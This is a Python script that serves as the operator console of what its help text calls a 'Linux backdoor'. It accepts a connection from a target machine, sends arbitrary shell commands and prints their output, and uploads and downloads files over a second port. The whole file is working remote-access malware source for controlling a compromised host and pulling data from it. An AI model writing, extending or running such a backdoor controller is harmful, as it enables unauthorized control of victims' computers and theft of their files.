#!/bin/python3

import socket
import os
import tqdm
import argparse

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5004
BUFFER_SIZE = 1024
SEPARATOR = "<SEPARATOR>"

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))

s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} connected!")

def message():
    loop = 0
    while loop == 0:
        content = input("Enter message: ")
        if content == "stop":
            loop = 1
            message = content.encode()
            client_socket.send(message)
        else:
            message = content.encode()
            client_socket.send(message)

def upload():
    
    host = input ("Enter client IP: ")
    port = int(input("Enter client port: "))
    file_name = input ("Enter filename: ")
    
    SEPARATOR = "<SEPARATOR>"
    filesize = os.path.getsize(file_name)
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")

    s.send(f"{file_name}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(range(filesize), f"Sending {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(file_name, "rb") as f:
        for _ in progress:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)
            progress.update(len(bytes_read))

    s.close()

def download():
    SERVER_HOST = client_address[0]
    SERVER_PORT = 9999
    SEPARATOR = "<SEPARATOR>"

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")
    client_socket, address = s.accept() 
    print(f"[+] {address} is connected.")

    received = client_socket.recv(BUFFER_SIZE).decode()
    file_name, filesize = received.split(SEPARATOR)
    file_name = os.path.basename(file_name)
    filesize = int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
 
    with open(file_name, "wb") as f:
        for _ in progress:
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:    
                break
            f.write(bytes_read)
            progress.update(len(bytes_read))
    client_socket.close()
    s.close()

print ("\nEnter 'commands' to see the custom commands options")

while True:

    command = input(">>> ")
    client_socket.send(command.encode())

    if command.lower() == "exit":
        break

    elif command.lower() == "message":
        message()
        
    elif command.lower() == "upload":
        upload()

    elif command.split(" ")[0] == "download":
        download()
    
    elif command.lower() == "commands":
        print ("""
                                    LINUX BACKDOOR COMMANDS
            -------------------------------------------------------------------------------
            [+] message - send meet to terminal window on targets machine
						  stop - will stop message option
            [+] upload - Upload a file to the target machine using a second port
            [+] download - Download a file from the target machine using a second port
            [+] exit - Shutdown the session down closing all sockets
            [+] list - list files with the current directory
            [+] commands - print this again
            -------------------------------------------------------------------------------
            [+] This program can been used to issue a valid linux command that is an other.
            """)
    
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
    
client_socket.close()
s.close()
